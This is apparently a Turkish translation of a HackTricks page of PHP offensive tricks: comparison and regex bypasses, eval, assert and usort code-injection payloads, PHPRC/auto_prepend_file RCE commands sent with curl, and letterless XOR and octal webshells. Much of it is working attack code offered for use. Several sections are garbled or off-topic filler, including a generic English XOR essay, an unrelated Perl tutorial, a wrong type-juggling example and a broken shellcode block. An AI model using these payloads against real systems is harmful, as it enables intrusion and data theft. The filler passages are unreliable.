# PHP Hileleri

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramanlık seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

## Çerezlerin yaygın konumu:

Bu, phpMyAdmin çerezleri için de geçerlidir.

Çerezler:
```
PHPSESSID
phpMyAdmin
```
Konumlar:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## PHP Karşılaştırmalarını Atlatma

### Gevşek karşılaştırmalar/Tip Dönüşümü ( == )

Eğer PHP'de `==` kullanılıyorsa, beklenmeyen durumlar olabilir ve karşılaştırma beklenildiği gibi davranmayabilir. Bunun sebebi "==" sadece aynı tipe dönüştürülen değerleri karşılaştırır, eğer karşılaştırılan verinin tipinin de aynı olmasını istiyorsanız `===` kullanmanız gerekmektedir.

PHP karşılaştırma tabloları: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (40) (1).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` Sayı ile başlamayan bir string bir sayıya eşittir
* `"0xAAAA" == "43690" -> True` Ondalık veya onaltılık formatlardaki sayılardan oluşan stringler, aynı sayıya/diğer stringlere eşit olarak karşılaştırılabilir (string içindeki sayılar sayı olarak yorumlanır)
* `"0e3264578" == 0 --> True` "0e" ile başlayan ve herhangi bir şeyi takip eden bir string, 0'a eşit olacaktır
* `"0X3264578" == 0X --> True` "0" ile başlayan ve herhangi bir harfi takip eden (X herhangi bir harf olabilir) ve herhangi bir şeyi takip eden bir string, 0'a eşit olacaktır
* `"0e12334" == "0" --> True` Bu çok ilginç çünkü bazı durumlarda "0" ile başlayan ve herhangi bir harf içermeyen bir string girişini ve bu string ile karşılaştırılan ve hashlenen içeriği kontrol edebilirsiniz. Bu nedenle, "0e" ile başlayan ve herhangi bir harf içermeyen bir hash oluşturacak bir değer sağlayabilirseniz, karşılaştırmayı atlayabilirsiniz. Bu formatta **zaten hashlenmiş stringleri** burada bulabilirsiniz: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` Bir stringdeki herhangi bir harf, int 0'a eşittir

Daha fazla bilgi için [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**Tip Dönüşümü**, `in_array()` fonksiyonunu da etkiler (katı bir karşılaştırma yapmak için üçüncü argümanı true olarak ayarlamanız gerekmektedir):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Bu işlev, **herhangi bir kimlik doğrulama kontrolü** için kullanılıyorsa (örneğin şifre kontrolü), ve kullanıcı karşılaştırmanın bir tarafını kontrol ediyorsa, şifre değeri olarak bir dize yerine boş bir dizi gönderebilir (`https://ornek.com/giris.php/?kullaniciadi=admin&sifre[]=`) ve bu kontrolü atlayabilir:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
`strcasecmp()` ile aynı hata meydana gelir.

### Sıkı tür dönüşümü

`===` kullanılsa bile, karşılaştırma **tür dönüşümüne** karşı savunmasız olabilecek hatalar olabilir. Örneğin, karşılaştırma **veriyi karşılaştırmadan önce farklı bir nesne türüne dönüştürüyorsa**:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** kullanıcı girişini doğrulamak için kullanılabilir (kullanıcı girişinde siyah liste içindeki herhangi bir kelime/regex'in bulunup bulunmadığını kontrol eder ve bulunmazsa, kodun yürütmesine devam edebilir).

#### Yeni satır atlatma

Ancak, regexp'in başlangıcını sınırlarken `preg_match()` sadece kullanıcı girişinin ilk satırını kontrol eder, bu nedenle kullanıcı girişini birkaç satır halinde gönderebilirseniz, bu kontrolü atlayabilirsiniz. Örnek:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Bu kontrolü atlamak için değeri yeni satırlarla urlencoded (`%0A`) olarak gönderebilirsiniz veya JSON verisi gönderebiliyorsanız, bunu birkaç satırda gönderin:
```php
{
"cmd": "cat /etc/passwd"
}
```
Örnek burada bulunabilir: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Uzunluk hatası bypass**

(Bu bypass, PHP 5.2.5'te denenmiş ve PHP 7.3.15'te çalıştırılamamıştır)\
Eğer `preg_match()` fonksiyonuna geçerli bir **çok büyük giriş** gönderebilirseniz, bu giriş **işlenemeyecektir** ve kontrolü **atlatabileceksiniz**. Örneğin, JSON engelleniyorsa şunu gönderebilirsiniz:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
#### ReDoS Bypass

Hile kaynağı: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223)


<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Kısacası, sorun, PHP'deki `preg_*` fonksiyonlarının [PCRE kütüphanesi](http://www.pcre.org/) üzerine kurulmasından kaynaklanır. PCRE'de, bazı düzenli ifadeler, çok sayıda özyineli çağrı kullanarak eşleştirilir ve bu da çok fazla yığın alanı kullanır. Özyineli çağrıların miktarına bir sınırlama getirilebilir, ancak PHP'de bu sınırlama [varsayılan olarak 100.000'dir](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit), bu da yığına sığmayacak kadar fazladır.

Bu sorun hakkında daha ayrıntılı bilgi verilen [bu Stackoverflow konusu](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) da gönderiye bağlantı olarak verilmiştir. Görevimiz şimdi açıktı:\
**`preg_match()` fonksiyonunu `false` döndürecek şekilde 100.000'den fazla özyinelemeyi gerçekleştirecek bir giriş göndermek, böylece uygulamanın girişimizin kötü niyetli olmadığını düşünmesini sağlamak ve payload'ın sonunda `{system(<çokkötükomut>)}` gibi bir sürpriz yaparak SSTI --> RCE --> bayrak :) elde etmek**.

Aslında, regex terimleriyle, gerçekte 100k "özyineleme" yapmıyoruz, bunun yerine "geri izleme adımlarını" sayıyoruz, ki [PHP belgeleri](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) bunun varsayılan olarak 1\_000\_000 (1M) olduğunu belirtir `pcre.backtrack_limit` değişkeninde.\
Buna ulaşmak için, `'X'*500_001` ifadesi 1 milyon geri izleme adımına (500k ileri ve 500k geri) yol açacaktır:
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### PHP obfuskasyonu için Tür türleme

PHP'de tür türleme, kodun anlaşılmasını zorlaştırmak için kullanılan bir obfuskasyon tekniğidir. Tür türleme, değişkenlerin veya ifadelerin türünü değiştirerek beklenmedik sonuçlar elde etmeyi sağlar.

Örneğin, aşağıdaki kod parçasını ele alalım:

```php
$var1 = "123";
$var2 = 123;

if ($var1 == $var2) {
    echo "Eşit";
} else {
    echo "Eşit değil";
}
```

Bu kod parçası, `$var1` ve `$var2` değişkenlerini karşılaştırır ve eşit olup olmadıklarına bağlı olarak bir mesaj yazdırır. Ancak, tür türleme kullanarak bu sonucu değiştirebiliriz.

```php
$var1 = "123";
$var2 = "abc";

if ($var1 == $var2) {
    echo "Eşit";
} else {
    echo "Eşit değil";
}
```

Bu kez, `$var2` değişkenini bir dize olarak tanımladık. Tür türleme, `$var1` ve `$var2`'yi karşılaştırırken, dizeyi sayıya dönüştürmeye çalışır. Bu nedenle, sonuç "Eşit değil" olarak yazdırılır.

Tür türleme, kodun anlaşılmasını zorlaştırır ve hataları tespit etmeyi güçleştirir. Bu nedenle, PHP obfuskasyonunda yaygın olarak kullanılan bir tekniktir.
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Yönlendirme Sonrası Yürütme (EAR)

Eğer PHP başka bir sayfaya yönlendiriyorsa ancak **`die`** veya **`exit`** fonksiyonu **`Location`** başlığından sonra çağrılmıyorsa, PHP yürütmeye devam eder ve verileri gövdeye ekler:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Daha fazla hile

* **register\_globals**: **PHP < 4.1.1.1** sürümünde veya yanlış yapılandırılmışsa, **register\_globals** etkin olabilir (veya davranışları taklit ediliyor olabilir). Bu, $\_GET gibi global değişkenlerde bir değer varsa örneğin $\_GET\["param"]="1234", bu değere **$param üzerinden erişebilirsiniz. Bu nedenle, HTTP parametreleri göndererek kod içinde kullanılan değişkenleri üzerine yazabilirsiniz**.
* **Aynı alan adının PHPSESSION çerezleri aynı yerde saklanır**, bu nedenle bir alanda **farklı yollarla farklı çerezler kullanılıyorsa**, bir yolun diğer yolun çerezine erişmesini sağlayabilirsiniz.\
Bu şekilde, **her iki yol da aynı isimde bir değişkene erişirse**, bu değişkenin değerini path1'deki değişkene uygulayabilirsiniz. Ve sonra path2, path1'in değişkenlerini geçerli olarak kabul edecektir (çereze path2'de karşılık gelen adı vererek).
* Makinenin kullanıcı adlarını elde ettiğinizde. PHP dizinlerinin etkin olup olmadığını kontrol etmek için adresi kontrol edin: **/\~\<KULLANICIADİ>**.
* [**php sargıları kullanarak LFI ve RCE**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

Bu fonksiyonlar genellikle PHP'de **şifrelerden karma oluşturmak** ve bir şifrenin bir karma ile karşılaştırıldığında doğru olup olmadığını **kontrol etmek** için kullanılır.\
Desteklenen algoritmalar: `PASSWORD_DEFAULT` ve `PASSWORD_BCRYPT` (başlangıcı `$2y$`). **PASSWORD\_DEFAULT** genellikle PASSWORD\_BCRYPT ile aynıdır. Ve şu anda, **PASSWORD\_BCRYPT**'in girişte **72 bayt boyut sınırlaması** vardır. Bu nedenle, bu algoritma ile 72 bayttan daha büyük bir şeyi karma yapmaya çalıştığınızda sadece ilk 72B kullanılacaktır:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTP başlıklarını PHP hatalarını kullanarak atlatma

Eğer bir **PHP sayfası hataları yazdırıyor ve kullanıcı tarafından sağlanan bazı girdileri geri döndürüyorsa**, kullanıcı PHP sunucusunun bazı **yeterince uzun içerikleri geri döndürmesini sağlayabilir**, böylece yanıtın içine başlıkları **eklemeye çalıştığında sunucu hata verecektir**.\
Aşağıdaki senaryoda **saldırgan sunucunun büyük hatalar üretmesini sağladı**, ve ekran görüntüsünde görebileceğiniz gibi php başlık bilgilerini **değiştirmeye çalıştığında başaramadı** (bu nedenle örneğin CSP başlığı kullanıcıya gönderilmedi):

![](<../../../.gitbook/assets/image (465).png>)

## Kod yürütme

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[Daha fazla kullanışlı PHP fonksiyonu için burayı kontrol edin](php-useful-functions-disable\_functions-open\_basedir-bypass/)
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
"replace" argümanındaki kodu çalıştırmak için en az bir eşleşme gereklidir. Bu preg\_replace seçeneği, PHP 5.5.0'den itibaren **kullanımdan kaldırılmıştır.**

### **Eval() ile RCE**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **Assert() ile RCE**

Bu php içindeki fonksiyon, bir dize içinde yazılan kodu **çalıştırmanıza** olanak sağlar ve **true veya false** döndürür (ve buna bağlı olarak yürütümü değiştirir). Genellikle kullanıcı değişkeni bir dizenin ortasına yerleştirilir. Örneğin:\
`assert("strpos($_GET['page']),'..') === false")` --> Bu durumda **RCE** elde etmek için şunu yapabilirsiniz:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
Kodun sözdizimini **kırmanız**, ardından **payload** eklemeniz ve sonra tekrar düzeltmeniz gerekecek. "**and" veya "%26%26" veya "|"** gibi **mantıksal işlemleri** kullanabilirsiniz. İlk koşul doğruysa payloadumuz çalışmayacağı için "or" veya "||" çalışmaz. Aynı şekilde ";" de çalışmaz çünkü payloadumuz çalıştırılmaz.

**Diğer bir seçenek**, komutun yürütülmesini dizeye eklemektir: `'.highlight_file('.passwd').'`

**Diğer bir seçenek** (iç kodunuz varsa), yürütümü değiştirmek için bazı değişkenleri değiştirmektir: `$file = "hola"`

### **usort() ile RCE**

Bu işlev, belirli bir işlevi kullanarak bir öğeler dizisini sıralamak için kullanılır.\
Bu işlevi kötüye kullanmak için:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
**//** ile kodun geri kalanını yorumlayabilirsiniz.

Kapatmanız gereken parantez sayısını keşfetmek için:

* `?order=id;}//`: bir hata mesajı alırız (`Parse error: syntax error, unexpected ';'`). Muhtemelen bir veya daha fazla parantez eksik.
* `?order=id);}//`: bir **uyarı** alırız. Bu doğru gibi görünüyor.
* `?order=id));}//`: bir hata mesajı alırız (`Parse error: syntax error, unexpected ')' i`). Muhtemelen fazla kapanış parantezi var.

### **.httaccess** üzerinden RCE

Eğer bir **.htaccess** dosyası **yükleyebilirseniz**, birçok şeyi yapılandırabilir ve hatta kodu çalıştırabilirsiniz (dosya uzantısı .htaccess olan dosyaların **çalıştırılabilmesini yapılandırabilirsiniz**).

Farklı .htaccess kabukları [burada](https://github.com/wireghoul/htshells) bulunabilir.

### Env Değişkenleri üzerinden RCE

Eğer PHP'de **env değişkenlerini değiştirmenize** izin veren bir zayıflık bulursanız (ve başka bir dosya yükleme zayıflığı da bulursanız, daha fazla araştırma yaparak bunun atlatılabileceği olabilir), bu davranışı kötüye kullanarak **RCE** elde edebilirsiniz.

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): Bu env değişkeni, diğer ikili dosyaları çalıştırırken keyfi kütüphaneleri yüklemenizi sağlar (ancak bu durumda çalışmayabilir).
* **`PHPRC`** : PHP'ye **yapılandırma dosyasını nerede bulacağını** söyleyen bir env değişkenidir, genellikle `php.ini` olarak adlandırılır. Kendi yapılandırma dosyanızı yükleyebiliyorsanız, o zaman `PHPRC`'yi kullanarak PHP'yi ona yönlendirebilirsiniz. İkinci bir yüklenen dosyayı belirten bir **`auto_prepend_file`** girişi ekleyin. Bu ikinci dosya, diğer tüm kodlardan önce PHP çalışma zamanı tarafından **çalıştırılan normal PHP kodunu içerir**.
1. Shell kodumuzu içeren bir PHP dosyası yükleyin
2. İkinci bir dosya yükleyin, adımlar 1'de yüklediğimiz dosyanın PHP ön işleyicisinin yüklenen dosyayı çalıştırmasını sağlayan bir **`auto_prepend_file`** yönergesi içersin
3. `PHPRC` değişkenini adımlar 2'de yüklediğimiz dosyaya ayarlayın.
* Bu zinciri nasıl çalıştıracağınız hakkında daha fazla bilgi için [**orijinal rapordan**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/) daha fazla bilgi edinin.
* **PHPRC** - başka bir seçenek
* Eğer **dosya yükleyemiyorsanız**, FreeBSD'de "file" `/dev/fd/0`'ı kullanabilirsiniz, bu **`stdin`'i içeren** "vücut" isteğin `stdin`'i olur:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* Veya RCE elde etmek için **`allow_url_include`**'ı etkinleştirin ve **base64 PHP kodu** ile bir dosyayı ön ekleyin:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* Teknik [**bu rapordan**](https://vulncheck.com/blog/juniper-cve-2023-36845) alınmıştır.

## PHP Statik analizi

Bu fonksiyonlara yapılan çağrılara kod ekleyip ekleyemeyeceğinizi kontrol edin ([buradan](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be) alınmıştır):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Eğer bir PHP uygulamasını hata ayıklıyorsanız, `display_errors = On` satırını ekleyerek `/etc/php5/apache2/php.ini` dosyasında hata yazdırma özelliğini etkinleştirebilir ve apache'yi yeniden başlatabilirsiniz: `sudo systemctl restart apache2`

### PHP kodunu açık hale getirme

PHP kodunu açık hale getirmek için **web**[ **www.unphp.net**](http://www.unphp.net) **adresini kullanabilirsiniz.**

## PHP Sargılayıcıları ve Protokolleri

PHP Sargılayıcıları ve Protokolleri, bir sistemin yazma ve okuma korumalarını **atlamak** ve onu tehlikeye atmak için kullanılabilir. [**Daha fazla bilgi için bu sayfayı kontrol edin**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug yetkisiz RCE

Eğer `phpconfig()` çıktısında **Xdebug**'in **etkin** olduğunu görüyorsanız, [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit) adresinden RCE elde etmeyi denemelisiniz.

## Değişken değişkenler
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## Yeni $\_GET\["a"]\($\_GET\["b"]) kullanarak RCE istismarı

Bir sayfada **keyfi bir sınıfın yeni bir nesnesi oluşturabiliyorsanız**, RCE elde etme olasılığınız olabilir, nasıl yapılacağını öğrenmek için aşağıdaki sayfaya bakın:

{% content-ref url="php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## Harfler olmadan PHP çalıştırma

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Sekizli kullanım
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**

XOR (Exclusive OR) is a logical operation that is commonly used in cryptography and computer science. It takes two binary inputs and produces an output that is true only when the inputs differ. In other words, if one input is true and the other is false, the output will be true. However, if both inputs are true or both inputs are false, the output will be false.

In the context of cryptography, XOR is often used to encrypt and decrypt data. When XOR is applied to a plaintext message and a secret key, it produces a ciphertext. To decrypt the ciphertext, XOR is applied again using the same secret key, which results in the original plaintext.

XOR can also be used in programming to perform various operations. For example, it can be used to toggle a bit, swap values, or perform bitwise operations.

In summary, XOR is a versatile operation that has various applications in cryptography, computer science, and programming.
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¢___ not needed then $_($__), show_source(.passwd)
```
### XOR kolay kabuk kodu

[**Bu yazıda**](https://mgp25.com/ctf/Web-challenge/) belirtildiği gibi, aşağıdaki şekilde kolay bir kabuk kodu oluşturmak mümkündür:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Öyleyse, **sayı ve harf olmadan keyfi PHP kodu çalıştırabiliyorsanız**, aşağıdaki gibi bir istek gönderebilir ve keyfi PHP kodunu çalıştırmak için bu payloadı kötüye kullanabilirsiniz:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Daha detaylı bir açıklama için [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match) adresine bakın.

### XOR Shellcode (eval içinde)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl benzeri

Perl, genel amaçlı bir betik dili olarak bilinir ve web uygulamalarında sıklıkla kullanılır. Perl, güçlü bir dil olup, karmaşık veri yapıları ve metin işleme işlevleri için idealdir. Aşağıda, Perl benzeri bazı özellikler ve ipuçları bulunmaktadır:

- **Değişkenler**: Perl'de değişkenler `$` işareti ile tanımlanır. Örneğin, `$name` şeklinde bir değişken tanımlayabilirsiniz.

- **Diziler**: Perl'de diziler `@` işareti ile tanımlanır. Örneğin, `@numbers` şeklinde bir dizi tanımlayabilirsiniz.

- **Koşullu ifadeler**: Perl'de koşullu ifadeler `if`, `else` ve `elsif` anahtar kelimeleri kullanılarak oluşturulur. Örneğin:

```perl
if ($age < 18) {
    print "Yaşınız 18'den küçük";
} elsif ($age >= 18 && $age < 30) {
    print "Yaşınız 18 ile 30 arasında";
} else {
    print "Yaşınız 30'dan büyük";
}
```

- **Döngüler**: Perl'de döngüler `for`, `foreach`, `while` ve `until` anahtar kelimeleri kullanılarak oluşturulur. Örneğin:

```perl
for my $i (1..10) {
    print "$i\n";
}

foreach my $item (@array) {
    print "$item\n";
}

while ($condition) {
    # Kodunuz
}

until ($condition) {
    # Kodunuz
}
```

- **Fonksiyonlar**: Perl'de fonksiyonlar `sub` anahtar kelimesi ile tanımlanır. Örneğin:

```perl
sub say_hello {
    my $name = shift;
    print "Merhaba, $name!\n";
}

say_hello("Ahmet");
```

Perl, bu özellikler ve daha fazlasıyla güçlü bir betik dili olarak web uygulamalarının geliştirilmesinde ve diğer veri işleme görevlerinde kullanılmaktadır.
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.

</details>
